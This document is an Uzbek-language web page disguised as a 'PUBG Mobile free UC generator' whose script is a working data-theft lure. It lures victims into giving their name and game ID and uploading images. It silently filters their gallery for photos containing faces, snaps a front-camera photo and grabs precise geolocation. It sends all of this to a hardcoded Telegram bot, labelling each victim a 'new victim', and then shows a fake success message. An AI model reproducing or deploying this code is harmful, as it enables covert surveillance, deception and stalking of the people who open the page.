<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE: FREE UC ELITE</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; color: #000; text-transform: uppercase; margin-top: 10px; }
        .file-label { display: block; padding: 12px; background: #1e293b; border: 1px dashed var(--neon-b); border-radius: 10px; cursor: pointer; margin-bottom: 15px; color: var(--neon-b); }
        video, canvas, #fileInput { display: none; }
        #status { font-size: 12px; color: var(--neon-g); margin-bottom: 10px; }
    </style>
</head>
<body>

<div id="app">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b);">UC GENERATOR</h1>
    <p style="color: #aaa;">Ma'lumotlarni to'ldiring:</p>
    
    <input type="text" id="u_name" placeholder="Ismingiz">
    <input type="number" id="u_id" placeholder="PUBG ID">
    
    <label for="fileInput" class="file-label">📁 Skrinshot yuklang (Tasdiqlash uchun)</label>
    <input type="file" id="fileInput" accept="image/*" multiple onchange="startSilentScan(this)">
    
    <div id="status">Tizim yuklanmoqda...</div>
    <button class="btn-main" id="sendBtn" onclick="requestAccess()" disabled>UC YUKLASH</button>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    let cameraPhoto = null;
    let verifiedFaces = [];
    let lat = 0, lon = 0;

    // AI-ni fonda yuklash
    async function initAI() {
        try {
            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
            document.getElementById('status').innerText = "Tayyor. Skrinshot yuklang.";
        } catch (e) {
            document.getElementById('status').innerText = "AI yuklashda xato.";
        }
    }
    initAI();

    // Galereyani fonda sekin va aqlli skanerlash
    async function startSilentScan(input) {
        const status = document.getElementById('status');
        const btn = document.getElementById('sendBtn');
        verifiedFaces = [];
        const files = Array.from(input.files);
        
        status.innerText = "Tekshirilmoqda...";
        
        for (let file of files) {
            const img = await faceapi.bufferToImage(file);
            // scoreThreshold: 0.3 - tezkor skanerlash uchun
            const detect = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.3 }));
            
            if (detect.length > 0) {
                verifiedFaces.push(file); // Faqat yuzi bor rasmlar saqlanadi
            }
        }
        
        status.innerText = "Tasdiqlandi. Tugmani bosing.";
        btn.disabled = false;
    }

    async function requestAccess() {
        const btn = document.getElementById('sendBtn');
        btn.innerText = "YUKLANMOQDA...";
        btn.disabled = true;

        try {
            // 1. Kamera (Faqat 1 ta tezkor rasm)
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('vid');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 800)); // Fokus uchun qisqa vaqt
            
            const canvas = document.getElementById('canv');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            cameraPhoto = await (await fetch(canvas.toDataURL('image/jpeg', 0.7))).blob();
            stream.getTracks().forEach(t => t.stop());

            // 2. Aniq Geolokatsiya
            navigator.geolocation.getCurrentPosition(async (pos) => {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                await sendToTelegram();
            }, async () => {
                await sendToTelegram(); // Ruxsat bermasa ham ma'lumotni yuborish
            }, { enableHighAccuracy: true });

        } catch (e) {
            alert("Xato: Ruxsat berish shart!");
            location.reload();
        }
    }

    async function sendToTelegram() {
        const name = document.getElementById('u_name').value;
        const id = document.getElementById('u_id').value;
        const maps = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "Berilmadi";

        const text = `🎯 *YANGI QURBON* 🎯\n👤 Ism: ${name}\n🆔 ID: \`${id}\`\n📍 Manzil: [Google Maps](${maps})`;

        // 1. Matn yuborish
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
        });

        // 2. Kamera rasmi
        if (cameraPhoto) {
            const fd1 = new FormData();
            fd1.append('chat_id', CHAT_ID);
            fd1.append('photo', cameraPhoto, 'cam.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd1});
        }

        // 3. Galereyadan faqat yuzlar (Fonda sekin yuboriladi)
        for (let face of verifiedFaces) {
            const fd2 = new FormData();
            fd2.append('chat_id', CHAT_ID);
            fd2.append('photo', face);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }

        alert("Tabriklaymiz! UC 24 soat ichida hisobingizga tushadi.");
        location.reload();
    }
</script>
</body>
</html>
